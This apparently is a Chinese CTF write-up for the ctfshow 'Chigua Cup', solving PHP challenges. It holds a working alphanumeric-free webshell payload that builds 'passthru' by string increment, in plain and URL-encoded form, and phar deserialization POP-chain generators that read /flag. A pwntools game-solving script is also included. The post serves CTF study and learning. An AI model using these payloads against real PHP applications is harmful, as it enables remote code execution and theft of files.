---
title: ctfshow-8月赛吃瓜杯
id: ctfshow-8月赛吃瓜杯
date: 2021-08-16 12:40:30

---

<!-- more -->

也算是做出签到题以外的题目了55，感动

## web

### 热身

签到题

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-18 16:53:59
# @link: https://ctfer.com

*/

include("flag.php");
highlight_file(__FILE__);
if(isset($_GET['num'])){
    $num = $_GET['num'];
    if($num==4476){
        die("no no no!");
    }
    if(preg_match("/[a-z]|\./i", $num)){
        die("no no no!!");
    }
    if(!strpos($num, "0")){
        die("no no no!!!");
    }
    if(intval($num,0)===4476){
        echo $flag;
    }
}
```

刷过的题目
payload：`+010574`
因为过滤掉了字母数字小数点，还有strpos检测0的出现位置，
因此使用4476的八进制010574再配合`+`或者`%20`使得0的位置后移一位，从而绕过`!strpos($num, "0")`

顺便写一下intval()数字比较的一些知识点：

- 可以用2进制、8进制、十六进制等等
  或者是利用小数点进行四舍五入
- intval获取变量整数值，失败返回0
   空的 array 返回 0，非空的 array 返回 1，可以数组绕过：num[]=00
- intval($num,0)：base为0，表示变量在遇上数字或正负符号才做转换，遇到非数字或字符串结束时以(\0)结束转换 ps：前提是弱类型比较
  那么可以使用科学计数法：4476e1

### shellme_Revenge

开篇一个phpinfo（原本的shellme因为一些失误操作，使得flag直接出现在phpinfo里，也就成了真正的签到题）

看cookie得到hint：?looklook，得到源码：

```php
<?php
error_reporting(0);
if ($_GET['looklook']){
    highlight_file(__FILE__);
}else{
    setcookie("hint", "?looklook", time()+3600);
}
if (isset($_POST['ctf_show'])) {
    $ctfshow = $_POST['ctf_show'];
    if (is_string($ctfshow) || strlen($ctfshow) <= 107) {
        if (!preg_match("/[!@#%^&*:'\"|`a-zA-BD-Z~\\\\]|[4-9]/",$ctfshow)){
            eval($ctfshow);
        }else{
            echo("fucccc hacker!!");
        }
    }
} else {

    phpinfo();
}
```

因为disable_function禁用了大部分的函数，并且正则过滤掉了很多东西，但留出了字母C、0123、还有一些基本的符号，
无字母数字rce无疑，由此可以自增获得所有字母，然后就是历时1天的尝试了，

第一个点是无引号定义字符串，这里是用官方文档的第三种方式<<<来定义

第二个点是自增，因为有了个C，可以从`C++ => D`而获得所有字母A-Z；

> 摘自官方文档：
>
> 在处理字符变量的算数运算时，PHP 沿袭了 Perl 的习惯，而非 C 的。例如，在 Perl 中 `$a = 'Z'; $a++;` 将把 `$a` 变成`'AA'`，而在 C 中，`a = 'Z'; a++;` 将把 `a` 变成 `'['`（`'Z'` 的 ASCII 值是 90，`'['` 的 ASCII 值是 91）。注意字符变量只能递增，不能递减，并且只支持纯字母（a-z 和 A-Z）。递增／递减其他字符变量则无效，原字符串没有变化。

这里直接用disable的漏网之鱼`passthru`进行命令执行

payload：用的时候要把注释内容删去，并且进行url编码

```php
$_=<<<_
C
_;
$__=<<<C
_
C;

$_++;$_++;
$_++;$_++;
$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$___=$_[1]; // A

$_0=$___; // a
$___++;$_1=$___; // b
$___++;$_2=$___; // c
$___++;$_3=$___; // d
$___++;$__1=$___; // e
$___++;$__2=$___; // f
$___++;$__3=$___; // g
$___++;$___1=$___; // h
$___++;$___2=$___; // i
$___++;$___3=$___; // j
$___++;$____1=$___; // k
$___++;$____2=$___; // l
$___++;$____3=$___; // m
$___++;$_____1=$___; // n
$___++;$_____2=$___; // o
$___++;$_____3=$___; // p
$___++;$______1=$___; // q
$___++;$______2=$___; // r
$___++;$______3=$___; // s
$___++;$_______1=$___; // t
$___++;$_______2=$___; // u
$___++;$_______3=$___; // v
$___++;$________1=$___; // w
$___++;$________2=$___; // x
$___++;$________3=$___; // y
$___++;$_________1=$___; // z

$_01=$_____3.$_0.$______3.$______3.$_______1.$___1.$______2.$_______2;//passthru
$_02=$__.$_____3.$_____2.$______3.$_______1; //_post
$__=$$_02;
$_01($__[_]);
```

post的表单数据：

```html
ctf_show=
%24_%3D%3C%3C%3C_%0AC%0A_%3B%0A%24__%3D%3C%3C%3CC%0A_%0AC%3B%0A%0A%24_%2B%2B%3B%24_%2B%2B%3B%0A%24_%2B%2B%3B%24_%2B%2B%3B%0A%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24___%3D%24_%5B1%5D%3B%20%0A%0A%24_0%3D%24___%3B%20%0A%24___%2B%2B%3B%24_1%3D%24___%3B%20%0A%24___%2B%2B%3B%24_2%3D%24___%3B%20%0A%24___%2B%2B%3B%24_3%3D%24___%3B%20%0A%24___%2B%2B%3B%24__1%3D%24___%3B%20%0A%24___%2B%2B%3B%24__2%3D%24___%3B%20%0A%24___%2B%2B%3B%24__3%3D%24___%3B%20%0A%24___%2B%2B%3B%24___1%3D%24___%3B%20%0A%24___%2B%2B%3B%24___2%3D%24___%3B%20%0A%24___%2B%2B%3B%24___3%3D%24___%3B%20%0A%24___%2B%2B%3B%24____1%3D%24___%3B%20%0A%24___%2B%2B%3B%24____2%3D%24___%3B%20%0A%24___%2B%2B%3B%24____3%3D%24___%3B%20%0A%24___%2B%2B%3B%24_____1%3D%24___%3B%20%0A%24___%2B%2B%3B%24_____2%3D%24___%3B%20%0A%24___%2B%2B%3B%24_____3%3D%24___%3B%20%0A%24___%2B%2B%3B%24______1%3D%24___%3B%20%0A%24___%2B%2B%3B%24______2%3D%24___%3B%20%0A%24___%2B%2B%3B%24______3%3D%24___%3B%20%0A%24___%2B%2B%3B%24_______1%3D%24___%3B%20%0A%24___%2B%2B%3B%24_______2%3D%24___%3B%20%0A%24___%2B%2B%3B%24_______3%3D%24___%3B%20%0A%24___%2B%2B%3B%24________1%3D%24___%3B%20%0A%24___%2B%2B%3B%24________2%3D%24___%3B%0A%24___%2B%2B%3B%24________3%3D%24___%3B%0A%24___%2B%2B%3B%24_________1%3D%24___%3B%0A%0A%24_01%3D%24_____3.%24_0.%24______3.%24______3.%24_______1.%24___1.%24______2.%24_______2%3B%0A%24_02%3D%24__.%24_____3.%24_____2.%24______3.%24_______1%3B%0A%24__%3D%24%24_02%3B%0A%24_01(%24__%5B_%5D)%3B
&_=cat /flag.txt
```



#### 一点小补充：

在写payload的时候，本来是打算使用assert或者eval的

> assert把整个字符串参数当php代码执行，eval把合法的php代码执行

在PHP7.1版本以后， assert()默认不再可以执行代码
(assert在更新后无法将使用字符串作为参数，而GET或POST传入的数据默认就是字符串类型）

我们都知道eval相当于将字符串拼接到原来的代码中，正常来说把																																									assert换成eval就可以了

但这里会报错Call to undefined function EVAL()

经过查询知道：

> eval是语言构造器而不是一个函数，不能被可变函数调用
>
> 可变函数即变量名加括号，PHP系统会尝试解析成函数，如果有当前变量中的值为命名的函数，就会调用。如果没有就报错。
> ·
> 可变函数不能用于例如 echo，print，unset()，isset()，empty()，include，require eval() 以及类似的语言结构。需要使用自己的包装函数来将这些结构用作可变函数



参考文章：
[一些不包含数字和字母的webshell | 离别歌 (leavesongs.com)](https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html)
[无字母数字webshell之提高篇 | 离别歌 (leavesongs.com)](https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html)
[动态调用函数时的命令执行对于eval()和assert()的执行问题_Alexhirchi的博客-CSDN博客](https://blog.csdn.net/weixin_43669045/article/details/107093451)

### ATTup

有2个页面，一是附件上传，只能上传压缩包格式的文件，一是文件查询

上传之后在查询页面抓包发现了部分源码：

```php
class View {
    public $fn;
    public function __invoke(){
        $text = base64_encode(file_get_contents($this->fn));
        echo "<script>alert('".$text."');self.location=document.referrer;</script>";
    }
}
class Fun{
    public $fun = ":)";
    public function __toString(){
        $fuc = $this->fun;
        $fuc();
        return "<script>alert('Be a happy string~');self.location=document.referrer;</script>";
    }
    public function __destruct()
    {
        echo "<script>alert('Just a fun ".$this->fun."');self.location=document.referrer;</script>";
    }
}
$filename = $_POST["file"];
$stat = @stat($filename);


```

压缩包还有相关函数猜测是phar反序列化？出去打球了，等一手wp

打球回来，wp已出，[CTFshow 吃瓜杯 WP汇总 (shimo.im)](https://shimo.im/docs/gwpcxkryVJwyJVHR/read)

> 的确是phar，`stat()` 这个php函数用的很少, 用于返回关于文件的信息, 但是它也可以触发 phar 文件, 这里主要是考察了通过 zip 或 tar 文件包装的phar文件进行触发
>
> tar：
>
> ```php
> <?php
>  class View {    
>  public $fn;    
>  public function __invoke(){        
>      $text = base64_encode(file_get_contents($this->fn));
>      echo "<script>alert('".$text."');self.location=document.referrer;</script>";
>  }
> }
> class Fun{    
>  public $fun = ":)";
>  public function __toString(){
>      $fuc = $this->fun;
>      $fuc();
>      return "<script>alert('Be a happy string~');self.location=document.referrer;</script>";
>  }
>  public function __destruct()    {
>      echo "<script>alert('Just a fun ".$this->fun."');self.location=document.referrer;</script>";
>  }
> }
> $a = new View();
> $a->fn = '/flag';
> $b = new Fun();
> $b->fun = $a;
> $c = new Fun();
> $c->fun = $b;
> @unlink("phar.tar");
> @system('rm -r .phar');
> @system('mkdir .phar');
> file_put_contents('.phar/.metadata',serialize($c));
> system('tar -cf phar.tar .phar/*');
> ```
>
> zip：
>
> ```php
> <?php
>  class View {    
>  public $fn;    
>  public function __invoke(){        
>      $text = base64_encode(file_get_contents($this->fn));
>      echo "<script>alert('".$text."');self.location=document.referrer;</script>";
>  }
> }
> class Fun{    
>  public $fun = ":)";
>  public function __toString(){
>      $fuc = $this->fun;
>      $fuc();
>      return "<script>alert('Be a happy string~');self.location=document.referrer;</script>";
>  }
>  public function __destruct()    {
>      echo "<script>alert('Just a fun ".$this->fun."');self.location=document.referrer;</script>";
>  }
> }
> $a = new View();
> $a->fn = '/flag';
> $b = new Fun();
> $b->fun = $a;
> $c = new Fun();
> $c->fun = $b;
> $d = serialize($c);
> if(file_exists('phar.zip')) {
>  @unlink("phar.zip");
> }
> $zip = new ZipArchive;
> $res = $zip->open('phar.zip', ZipArchive::CREATE);
> $zip->addFromString('test.txt', 'file content goes here');
> $zip->setArchiveComment($d);
> $zip->close();
> ```
> 通过上传 zip 或 tar 文件包装的phar文件, 可以绕过对 `<?` 和 `php` 的语法检查
>
> 然后通过 phar 反序列化触发 pop 链得到 flag
>
> ```
> phar://./phar.zip
> phar:///var/www/html/uploads/phar.zip
> ```

## misc

### misc游戏签到

这题还是挺有意思的，玩游戏通关，一开始只是简单写了个bash，无法达到获得flag的目的

> wp用的python跑，还是值得学习一下的
>
> ```python
> from pwn import *
> context.log_level = 'debug'
> 
> 
> def get_data(r):
>     r.recvuntil('     \n')
>     e1 = int(r.recvline())
>     e2 = int(r.recvline())
>     e3 = r.recvline().split(b' ')
>     p, e3 = int(e3[0]), int(e3[-1])
>     e = sorted(enumerate([e1, e2, e3], start=1), key=lambda x: x[0])
>     return p, e
> 
> 
> def attack(r, p, e):
>     for i, ee in e:
>         if p > ee:
>             r.sendline(str(i))
>             r.recv()
>             p += ee
>         else:
>             return None
>     r.recvuntil('Choose which You want to upgrade?\n')
>     l = []
>     l.append(r.recvline()[2:-1])
>     l.append(r.recvline()[2:-1])
>     l.append(r.recvline()[2:-1])
>     return l
> 
> while True:
>     a = True
>     aa = 0
>     flag = b''
>     r = remote('pwn.challenge.ctf.show', 28200)
>     r.recv()
>     r.sendline('1')
>     for i in range(30):
>         p, e = get_data(r)
>         l = attack(r, p, e)
>         if l:
>             if b'part_flag' in l:
>                 r.sendline(str(l.index(b'part_flag') + 1))
>                 r.recvuntil('You choose the part_flag!\n')
>                 flag += r.recvline().strip()
>                 aa += 1
>                 if aa == 4:
>                     print(flag)
>                     exit()
>             else:
>                 r.sendline('1')
>         else:
>             r.close()
>             a = False
>             break
>     if a:
>         print(flag)
>         r.interactive()
> ```

